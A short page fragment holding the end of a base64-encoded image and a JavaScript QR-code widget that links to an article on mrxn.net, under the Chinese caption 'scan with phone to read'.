VTsGzHUQbn8Ih2fsHvt2Xb5C6yB7dJ95dYgPZux56/bwaSAWX/iZG/jjgUCeBo8PM/cpMN8R4ocZV3XqYu838u4545AzjD1qbV3HylV0XV65MdTV4Hm/Px6IzS/8OzfwxwPpU/dYkOlDUF20TlQXYb/OvGh9oZoI6QFB9fJWyMXSKiB+CJqHmat3hPiqV0XPdw7xA9e/qd++7OPpDamJ7sXZuSFT7r7eyzzM/u7r3DoRUg8PNNdr5eYhNfKO+kWIX979cph9sM/122/Ep4FovvAzN7ANBDJNOMbVMccp11ofpJ+8chXyFcJc133Vo2LUi1dAamFGveWpgDkP4frgmHdf9axQ71i5CnVIf3jgNhBNF372Bq6BfPb+n3b/DwAAAP//TAjPgAAAAAZJREFUAwAps3StT3SoNAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 